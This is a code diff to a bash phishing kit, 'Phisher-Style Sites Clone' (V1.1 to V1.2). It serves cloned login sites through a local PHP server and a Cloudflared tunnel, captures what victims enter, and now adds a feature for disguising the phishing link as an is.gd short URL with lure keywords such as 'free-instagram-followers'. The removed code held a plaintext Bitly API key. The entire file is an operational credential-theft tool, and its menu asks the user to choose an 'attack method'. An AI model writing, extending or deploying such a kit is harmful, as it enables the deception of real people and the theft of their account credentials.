@@ -28,7 +28,7 @@ banner() {
     echo -e "${BRIGHT_CYAN}"
     echo -e "      █████▒▒ PHISHER-STYLE SITES CLONE ▒▒█████"
     echo -e "                  
-                 ████▒▒ ${YELLOW}V1.1${BRIGHT_CYAN} ▒▒████"
+                 ████▒▒ ${YELLOW}V1.2${BRIGHT_CYAN} ▒▒████"
     echo -e ""
     echo -e "  Feedback And Tell Which Phishing Sites You Want"
     echo -e "             Instagram = @Shyam.npl1"
@@ -233,48 +233,50 @@ start_localhost() {
     capture_data
 }
 
-start_cloudflared() {
-    BITLY_API_KEY="b21642ce493e8139eb813daaeba111fd6ec305f1" # Note: This public key might not work.
-    random_port
-    echo -e "\n${BRIGHT_GREEN}[+] Launching Cloudflared tunnel on port $PORT...${NC}"
-    
-    setup_site
-    php -S "$HOST:$PORT" > /dev/null 2>&1 &
-    
+get_cloudflared_url() {
     # Remove old log file to avoid reading a stale URL
     rm -f .cfurl.log
     
     # Start cloudflared in the background
     cloudflared tunnel --url "http://$HOST:$PORT" > .cfurl.log 2>&1 &
 
-    # --- NEW RELIABLE LOGIC STARTS HERE ---
-    
-    echo -e "${BRIGHT_YELLOW}[•] Waiting for Cloudflared URL... (Wait 20 seconds)${NC}"
+    echo -e "${BRIGHT_YELLOW}[•] Waiting for Cloudflared URL... (Max 20 seconds)${NC}"
     URL=""
-    # Loop for 20 seconds, checking for the URL every second
     for i in {1..20}; do
-        # Grep the URL from the log file
         URL=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare.com' .cfurl.log | head -n 1)
         if [[ -n "$URL" ]]; then
-            # If URL is found, break the loop
-            break
+            echo "$URL"
+            return 0
         fi
         sleep 1
     done
+    return 1
+}
 
-    # --- NEW RELIABLE LOGIC ENDS HERE ---
+start_custom_url() {
+    random_port
+    echo -e "\n${BRIGHT_GREEN}[+] Launching Cloudflared for Custom URL...${NC}"
+    setup_site
+    php -S "$HOST:$PORT" > /dev/null 2>&1 &
 
-    # Check if the URL was found or if the loop timed out
+    URL=$(get_cloudflared_url)
+
     if [[ -n "$URL" ]]; then
-        SHORT_URL=$(shorten_url "$URL")
-        echo -e "${BRIGHT_GREEN}[✓] LIVE URL: ${BRIGHT_CYAN}$URL${NC}"
-        # Check if Bitly URL was created successfully
-        if [[ -n "$SHORT_URL" ]]; then
-            echo -e "${BRIGHT_GREEN}[✓] Shortened URL: ${BRIGHT_CYAN}$SHORT_URL${NC}"
+        echo -e "${BRIGHT_GREEN}[✓] Cloudflare URL Generated: ${BRIGHT_CYAN}$URL${NC}"
+        echo -ne "${BRIGHT_YELLOW}[>] Enter custom keywords (e.g., free-instagram-followers): ${NC}"
+        read -r custom_alias
+
+        if [[ -n "$custom_alias" ]]; then
+            CUSTOM_URL=$(shorten_url "$URL" "$custom_alias")
+            if [[ "$CUSTOM_URL" == *"https://is.gd/"* ]]; then
+                 echo -e "${BRIGHT_GREEN}[✓] Custom URL: ${BRIGHT_CYAN}$CUSTOM_URL${NC}"
+            else
+                 echo -e "${RED}[!] Custom alias might be taken or invalid. Error: ${CUSTOM_URL}${NC}"
+            fi
         else
-            echo -e "${BRIGHT_YELLOW}[!] Could not shorten URL. The Bitly API key might be invalid.${NC}"
+            echo -e "${RED}[!] No keywords entered. Aborting.${NC}"
         fi
-        echo "" # Add a newline for better formatting
+        echo ""
         capture_data
     else
         echo -e "${RED}[!] Failed to generate Cloudflared URL after 20 seconds.${NC}"
@@ -283,31 +285,57 @@ start_cloudflared() {
     fi
 }
 
+start_cloudflared() {
+    random_port
+    echo -e "\n${BRIGHT_GREEN}[+] Launching Cloudflared tunnel on port $PORT...${NC}"
+    setup_site
+    php -S "$HOST:$PORT" > /dev/null 2>&1 &
+    
+    URL=$(get_cloudflared_url)
+
+    if [[ -n "$URL" ]]; then
+        SHORT_URL=$(shorten_url "$URL")
+        echo -e "${BRIGHT_GREEN}[✓] LIVE URL: ${BRIGHT_CYAN}$URL${NC}"
+        if [[ -n "$SHORT_URL" ]]; then
+            echo -e "${BRIGHT_GREEN}[✓] Shortened URL: ${BRIGHT_CYAN}$SHORT_URL${NC}"
+        fi
+        echo ""
+        capture_data
+    else
+        echo -e "${RED}[!] Failed to generate Cloudflared URL after 20 seconds.${NC}"
+        echo -e "${YELLOW}[!] Check the log for errors:${NC}"
+        cat .cfurl.log
+    fi
+}
 
 shorten_url() {
     local long_url="$1"
-    response=$(curl -s -X POST "https://api-ssl.bitly.com/v4/shorten" \
-        -H "Authorization: Bearer $BITLY_API_KEY" \
-        -H "Content-Type: application/json" \
-        -d "{\"long_url\": \"$long_url\"}")
+    local custom_alias="$2"
     
-    echo "$response" | grep -o '"link": *"[^"]*' | cut -d'"' -f4
+    # is.gd ka istemaal karke URL ko chhota karein, kyunki yeh custom alias support karta hai.
+    if [[ -n "$custom_alias" ]]; then
+        # Agar custom alias diya gaya hai
+        curl -s "https://is.gd/create.php?format=simple&url=${long_url}&shorturl=${custom_alias}"
+    else
+        # Agar koi custom alias nahi hai
+        curl -s "https://is.gd/create.php?format=simple&url=${long_url}"
+    fi
 }
 
-
 tunnel_menu() {
-    echo -e "\n${RED}[${WHITE}01${RED}]${BRIGHT_YELLOW} Localhost  ( ${BRIGHT_GREEN}Random Port${BRIGHT_YELLOW} )"
-    echo -e "${RED}[${WHITE}02${RED}]${BRIGHT_YELLOW} Cloudflared"
-    echo -e "${RED}[${WHITE}03${RED}]${BRIGHT_YELLOW} Back to Site Selection"
-    echo -e "${RED}[${WHITE}04${RED}]${BRIGHT_YELLOW} Exit"
+    echo -e "\n${RED}[${WHITE}01${RED}]${BRIGHT_YELLOW} Localhost"
+    echo -e "${RED}[${WHITE}02${RED}]${BRIGHT_YELLOW} Cloudflared (Random URL)"
+    echo -e "${RED}[${WHITE}03${RED}]${BRIGHT_YELLOW} Custom URL (Cloudflared)"
+    echo -e "${RED}[${WHITE}04${RED}]${BRIGHT_YELLOW} Back to Site Selection"
+    echo -e "${RED}[${WHITE}00${RED}]${BRIGHT_YELLOW} Exit"
     echo -ne "\n${BRIGHT_CYAN}[>] Choose attack method: ${NC}"
     read tunnel_option
-
 
     case $tunnel_option in
         1) start_localhost ;;
         2) start_cloudflared ;;
-        3) select_site ;;
+        3) start_custom_url ;;
+        4) select_site ;;
         0) exit ;;
         *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; tunnel_menu ;;
     esac
